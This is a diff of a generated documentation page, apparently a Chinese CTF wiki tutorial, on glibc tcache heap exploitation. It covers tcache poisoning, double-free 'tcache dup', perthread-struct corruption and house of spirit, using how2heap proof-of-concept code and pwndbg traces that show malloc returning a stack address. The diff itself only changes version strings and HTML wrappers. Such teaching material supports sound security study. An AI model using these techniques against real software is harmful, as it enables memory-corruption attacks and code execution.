@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -5216,7 +5216,7 @@
 <h2 id="tcache-makes-heap-exploitation-easy-again">tcache makes heap exploitation easy again<a class="headerlink" href="#tcache-makes-heap-exploitation-easy-again" title="Permanent link">&para;</a></h2>
 <h3 id="0x01-tcache-overview">0x01 Tcache overview<a class="headerlink" href="#0x01-tcache-overview" title="Permanent link">&para;</a></h3>
 <p>在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_perthread_struct</p>
-<div class="codehilite"><pre><span></span><span class="cm">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span>
+<div class="codehilite"><pre><span></span><code><span class="cm">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span>
 <span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
 <span class="p">{</span>
   <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
@@ -5230,10 +5230,10 @@
 <span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>
 
 <span class="k">static</span> <span class="n">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-</pre></div>
+</code></pre></div>
 
 <p>其中有两个重要的函数， <code>tcache_get()</code> 和 <code>tcache_put()</code>:</p>
-<div class="codehilite"><pre><span></span><span class="k">static</span> <span class="kt">void</span>
+<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span>
 <span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
@@ -5253,17 +5253,17 @@
   <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
   <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>这两个函数会在函数 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173">_int_free</a> 和 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051">__libc_malloc</a> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个tcache bin中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p>
-<div class="codehilite"><pre><span></span><span class="cm">/* This is another arbitrary limit, which tunables can change.  Each</span>
+<div class="codehilite"><pre><span></span><code><span class="cm">/* This is another arbitrary limit, which tunables can change.  Each</span>
 <span class="cm">   tcache bin will hold at most this number of chunks.  */</span>
 <span class="cp"># define TCACHE_FILL_COUNT 7</span>
 <span class="cp">#endif</span>
-</pre></div>
+</code></pre></div>
 
 <p>再复习一遍 <code>tcache_get()</code> 的源码</p>
-<p><div class="codehilite"><pre><span></span><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span>
+<p><div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span>
 <span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
@@ -5273,14 +5273,14 @@
   <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
   <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 在 <code>tcache_get</code> 中，仅仅检查了 <strong>tc_idx</strong> ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p>
 <h3 id="0x02-tcache-usage">0x02 Tcache Usage<a class="headerlink" href="#0x02-tcache-usage" title="Permanent link">&para;</a></h3>
 <ul>
 <li>内存释放：</li>
 </ul>
 <p>可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。</p>
-<div class="codehilite"><pre><span></span><span class="n">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="n">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">;</span>        <span class="cm">/* its size */</span>
   <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>             <span class="cm">/* associated fastbin */</span>
@@ -5323,7 +5323,7 @@
 
 <span class="p">......</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>内存申请：</li>
@@ -5333,7 +5333,7 @@
 <p>（2）其次，申请的内存块符合smallbin大小时并且在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。</p>
 <p>（3）当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。</p>
 <p>代码太长就不全贴了，贴个符合fastbin 的时候</p>
-<div class="codehilite"><pre><span></span>  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">get_max_fast</span> <span class="p">()))</span>
+<div class="codehilite"><pre><span></span><code>  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">get_max_fast</span> <span class="p">()))</span>
     <span class="p">{</span>
       <span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
       <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
@@ -5382,7 +5382,7 @@
         <span class="p">}</span>
     <span class="p">}</span>
     <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>
@@ -5392,7 +5392,7 @@
 <p>在循环处理unsorted bin内存块时，如果达到放入unsorted bin块最大数量，会立即返回。默认是0，即不存在上限。</p>
 </li>
 </ul>
-<div class="codehilite"><pre><span></span><span class="cp">#if USE_TCACHE</span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#if USE_TCACHE</span>
       <span class="cm">/* If we&#39;ve processed as many chunks as we&#39;re allowed while</span>
 <span class="cm">   filling the cache, return one of the cached ones.  */</span>
       <span class="o">++</span><span class="n">tcache_unsorted_count</span><span class="p">;</span>
@@ -5403,26 +5403,26 @@
         <span class="k">return</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span>
       <span class="p">}</span>
 <span class="cp">#endif</span>
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。</li>
 </ul>
-<div class="codehilite"><pre><span></span><span class="cp">#if USE_TCACHE</span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#if USE_TCACHE</span>
       <span class="cm">/* If all the small chunks we found ended up cached, return one now.  */</span>
       <span class="k">if</span> <span class="p">(</span><span class="n">return_cached</span><span class="p">)</span>
       <span class="p">{</span>
         <span class="k">return</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span>
       <span class="p">}</span>
 <span class="cp">#endif</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="0x03-pwn-tcache">0x03 Pwn Tcache<a class="headerlink" href="#0x03-pwn-tcache" title="Permanent link">&para;</a></h3>
 <h4 id="tcache-poisoning">tcache poisoning<a class="headerlink" href="#tcache-poisoning" title="Permanent link">&para;</a></h4>
 <p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
 <p>以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_poisoning</a> 为例</p>
 <p>看一下源码</p>
-<div class="codehilite"><pre><span></span><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
+<div class="codehilite"><pre><span></span><code><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
 <span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
        <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
 <span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
@@ -5465,10 +5465,10 @@
   <span class="mi">32</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="mi">33</span>   <span class="err">│</span> <span class="p">}</span>
 <span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
-</pre></div>
+</code></pre></div>
 
 <p>运行结果是
-<div class="codehilite"><pre><span></span>glibc_2.26 <span class="o">[</span>master●<span class="o">]</span> ./tcache_poisoning 
+<div class="codehilite"><pre><span></span><code>glibc_2.26 <span class="o">[</span>master●<span class="o">]</span> ./tcache_poisoning 
 This file demonstrates a simple tcache poisoning attack by tricking malloc into
 returning a pointer to an arbitrary location <span class="o">(</span>in this <span class="k">case</span>, the stack<span class="o">)</span>.
 The attack is very similar to fastbin corruption attack.
@@ -5484,9 +5484,9 @@ to point to the location to control <span class="o">(</span>0x7fff0d28a0c8<span 
 Now the tcache list has <span class="o">[</span> 0x7fff0d28a0c8 <span class="o">]</span>.
 2st malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x7fff0d28a0c8
 We got the control
-</pre></div>
+</code></pre></div>
 分析一下，程序先申请了一个大小是 128 的 chunk，然后 free。128 在 tcache 的范围内，因此 free 之后该 chunk 被放到了 tcache 中，调试如下：
-<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> 
+<div class="codehilite"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> 
 <span class="mi">0x0000555555554815</span>  <span class="mi">18</span>      <span class="no">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
 <span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
 <span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
@@ -5584,10 +5584,10 @@ We got the control
   <span class="nf">counts</span> <span class="err">=</span> <span class="err">&quot;\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">001</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&#39;\</span><span class="mi">000</span><span class="err">&#39;</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">55</span> <span class="no">times</span><span class="err">&gt;</span><span class="p">,</span>
   <span class="nf">entries</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x555555756260</span><span class="p">,</span> <span class="mi">0x0</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">56</span> <span class="no">times</span><span class="err">&gt;}</span>
 <span class="err">}</span>
-</pre></div>
+</code></pre></div>
 可以看到，此时第 8 条 tcache 链上已经有了一个 chunk，从 <code>tcache_prethread_struct</code> 结构体中也能得到同样的结论 </p>
 <p>然后修改 tcache 的 next
-<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> 
+<div class="codehilite"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> 
 <span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="mi">8</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="mi">0x555555756260</span>
 <span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="mi">0x7fffffffdfa8</span><span class="p">).</span>
 <span class="err">23</span>      <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c">;</span>
@@ -5731,10 +5731,10 @@ We got the control
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
 <span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
-</pre></div>
+</code></pre></div>
 此时，第 8 条 tcache 链的 next 已经被改成栈上的地址了。接下来类似 fastbin attack，只需进行两次 <code>malloc(128)</code> 即可控制栈上的空间。</p>
 <p>第一次 malloc
-<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
 <span class="err">1</span><span class="nf">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="mi">0x555555756260</span>
 <span class="err">26</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
 <span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
@@ -5806,9 +5806,9 @@ We got the control
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
 <span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>第二次 malloc，即可 malloc 栈上的地址了
-<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
 <span class="err">3886144</span>
 <span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
 <span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
@@ -5882,11 +5882,11 @@ We got the control
 <span class="err">07:0038│</span>          <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">i</span> <span class="no">r</span> <span class="no">rax</span>
 <span class="nf">rax</span>            <span class="mi">0x7fffffffdfa8</span>   <span class="mi">140737488347048</span>
-</pre></div>
+</code></pre></div>
 可以看出 <code>tcache posioning</code> 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。</p>
 <h4 id="tcache-dup">tcache dup<a class="headerlink" href="#tcache-dup" title="Permanent link">&para;</a></h4>
 <p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨
-<div class="codehilite"><pre><span></span><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
+<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
 <span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
@@ -5895,11 +5895,11 @@ We got the control
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
   <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
 <p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
 <p>以 how2heap 的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache_dup</a> 为例分析，源码如下：
-<div class="codehilite"><pre><span></span><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span> 
+<div class="codehilite"><pre><span></span><code><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span> 
 <span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
        <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span>
 <span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
@@ -5926,9 +5926,9 @@ We got the control
   <span class="mi">19</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="mi">20</span>   <span class="err">│</span> <span class="p">}</span>
 <span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>调试一下，第一次 free
-<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
 <span class="err">14</span>      <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
 <span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
 <span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
@@ -6001,10 +6001,10 @@ We got the control
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
 <span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
-</pre></div>
+</code></pre></div>
 tcache 的第一条链放入了一个 chunk</p>
 <p>第二次 free 时，虽然 free 的是同一个 chunk，但因为 <code>tcache_put()</code> 没有做任何检查，因此程序不会 crash
-<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
 <span class="err">16</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">free</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span><span class="p">,</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
 <span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
 <span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
@@ -6075,13 +6075,13 @@ tcache 的第一条链放入了一个 chunk</p>
        <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
             <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
 <span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x555555756260</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555756260</span> <span class="p">(</span><span class="no">overlap</span> <span class="no">chunk</span> <span class="no">with</span> <span class="mi">0x555555756250</span><span class="p">(</span><span class="no">freed</span><span class="p">)</span> <span class="p">)</span>
-</pre></div>
+</code></pre></div>
 可以看出，这种方法与 <code>fastbin dup</code> 相比也简单了很多。</p>
 <h4 id="tcache-perthread-corruption">tcache perthread corruption<a class="headerlink" href="#tcache-perthread-corruption" title="Permanent link">&para;</a></h4>
 <p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
 <p>这里没找到太好的例子，自己想了一种情况</p>
 <p>设想有如下的堆排布情况
-<div class="codehilite"><pre><span></span>tcache_    +------------+
+<div class="codehilite"><pre><span></span><code>tcache_    +------------+
 \perthread |......      |
 \_struct   +------------+
            |counts[i]   |
@@ -6093,9 +6093,9 @@ tcache 的第一条链放入了一个 chunk</p>
            |......      |          +----------+
            |            |          |          |
            +------------+          +----------+
-</pre></div>
+</code></pre></div>
 通过一些手段（如 <code>tcache posioning</code>），我们将其改为了
-<div class="codehilite"><pre><span></span>tcache_    +------------+&lt;---------------------------+
+<div class="codehilite"><pre><span></span><code>tcache_    +------------+&lt;---------------------------+
 \perthread |......      |                            |
 \_struct   +------------+                            |
            |counts[i]   |                            |
@@ -6107,12 +6107,12 @@ tcache 的第一条链放入了一个 chunk</p>
            |......      |          +----------+
            |            |          |          |
            +------------+          +----------+
-</pre></div>
+</code></pre></div>
 这样，两次 malloc 后我们就返回了 <code>tcache_prethread_struct</code> 的地址，就可以控制整个 tcache 了。</p>
 <p><strong>因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</strong></p>
 <h4 id="tcache-house-of-spirit">tcache house of spirit<a class="headerlink" href="#tcache-house-of-spirit" title="Permanent link">&para;</a></h4>
 <p>拿 how2heap 的源码来讲：</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
@@ -6150,10 +6150,10 @@ tcache 的第一条链放入了一个 chunk</p>
     <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
     <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
